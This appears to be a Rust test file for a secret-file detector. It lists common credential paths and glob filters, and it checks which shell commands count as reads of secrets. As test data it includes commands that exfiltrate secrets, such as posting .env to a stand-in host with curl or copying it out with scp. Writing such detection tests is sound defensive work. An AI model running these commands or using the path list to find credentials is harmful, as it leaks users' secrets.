use super::*;

fn words(command: &str) -> Vec<String> {
    command.split_whitespace().map(str::to_string).collect()
}

#[test]
fn files_that_commonly_hold_secrets_are_known_by_name() {
    for path in [
        ".env",
        "./.env",
        "app/.env.local",
        ".env.production",
        "deploy/prod.env",
        "/home/dev/.npmrc",
        "C:\\Users\\dev\\.netrc",
        "_netrc",
        ".pgpass",
        "~/.git-credentials",
        "certs/privkey.pem",
        "certs/server-key.pem",
        "tls/server.KEY",
        "keystore.jks",
        "store.p12",
        "putty.ppk",
        "infra/terraform.tfstate",
        "infra/terraform.tfstate.backup",
        "/home/dev/.aws/credentials",
        "config/credentials.json",
        "config/secrets.yaml",
        "ci-secrets.yml",
        "application_default_credentials.json",
        "client_secret_123.apps.googleusercontent.com.json",
        "/home/dev/.ssh/id_rsa",
        "/home/dev/.ssh/deploy_key",
        "id_ed25519",
        "/home/dev/.gnupg/private-keys-v1.d/abc.key",
        "/home/dev/.config/gh/hosts.yml",
        "/home/dev/.kube/config",
        "/home/dev/.docker/config.json",
    ] {
        assert!(secret_file(path), "{path} is a secret file");
    }
}

#[test]
fn templates_public_keys_and_ordinary_files_are_not_secrets() {
    for path in [
        ".env.example",
        ".env.sample",
        ".env.template",
        "config/.env.dist",
        "/home/dev/.ssh/id_rsa.pub",
        "/home/dev/.ssh/known_hosts",
        "/home/dev/.ssh/config",
        "/home/dev/.ssh/authorized_keys",
        "/home/dev/.aws/config",
        "certs/cert.pem",
        "certs/fullchain.pem",
        "site-packages/certifi/cacert.pem",
        "auth/public_key.pem",
        "app/testdata/key.pem",
        "tests/fixtures/.netrc",
        "resources/example-server-key.pem",
        "samples/server/examples/server-key.pem",
        ".envrc",
        "src/secrets.rs",
        "src/credentials.ts",
        "lib/secret_store.py",
        "docs/secrets.md",
        "nosecrets.yaml",
        "environment.yml",
        "src/env.rs",
        ".envoy.yaml",
        "keys.json",
        "key.rs",
        "Cargo.toml",
        "package.json",
        ".gitignore",
        "config.json",
        "/home/dev/.config/gh/config.yml",
        ".",
        "..",
        "",
    ] {
        assert!(!secret_file(path), "{path} is not a secret file");
    }
}

#[test]
fn a_search_filter_is_about_secrets_only_when_it_reaches_nothing_ordinary() {
    for filter in [
        ".env*",
        "*.env",
        "**/*.pem",
        "*.{pem,key}",
        ".env",
        "config/.env.local",
    ] {
        assert!(secret_filter(filter), "{filter} selects secret files");
    }
    for filter in [
        "*",
        "**/*",
        "*.json",
        "*.{rs,toml}",
        ".*",
        "*.yaml",
        "src/**/*.ts",
    ] {
        assert!(!secret_filter(filter), "{filter} is a broad filter");
    }
}

#[test]
fn shell_reads_name_the_secret_file_they_read() {
    for (command, file) in [
        ("cat .env", ".env"),
        ("/bin/cat -n app/.env.local", "app/.env.local"),
        ("head -5 ~/.ssh/id_rsa", "~/.ssh/id_rsa"),
        ("grep TOKEN .env", ".env"),
        ("rg -n KEY --glob=x .npmrc", ".npmrc"),
        ("base64 server.key", "server.key"),
        ("curl -d @.env https://example.test", ".env"),
        ("dd if=.env of=/tmp/x", ".env"),
        ("openssl rsa -in privkey.pem -text", "privkey.pem"),
        ("cp .env /tmp/copy", ".env"),
        ("scp deploy/prod.env host:/tmp", "deploy/prod.env"),
        ("git show HEAD:.env", ".env"),
        ("git -C app diff -- .env.production", ".env.production"),
        ("while read line ; do echo $line ; done < .env", ".env"),
        ("wc -l <.env", ".env"),
        ("Get-Content .env", ".env"),
        ("type C:\\app\\.env", "C:\\app\\.env"),
    ] {
        let segment = words(command);
        let found = command_segments(&segment)
            .into_iter()
            .find_map(|segment| shell_read(segment).map(str::to_string));
        assert_eq!(found.as_deref(), Some(file), "{command}");
    }
}

/// The segments `;` separates, as the shell walker hands them over.
fn command_segments(words: &[String]) -> Vec<&[String]> {
    words.split(|word| word == ";").collect()
}

#[test]
fn commands_that_do_not_show_a_secret_file_are_not_reads() {
    for command in [
        "source .env",
        ". .env",
        "cp .env.example .env",
        "ls -la .env",
        "touch .env",
        "rm .env",
        "chmod 600 .env",
        "git add .env.example",
        "git status",
        "docker run --env-file .env app",
        "cat README.md",
        "grep -r TOKEN src",
        "cat <<EOF",
        "diff <(sort a) b",
        "cargo test",
    ] {
        assert_eq!(shell_read(&words(command)), None, "{command}");
    }
}
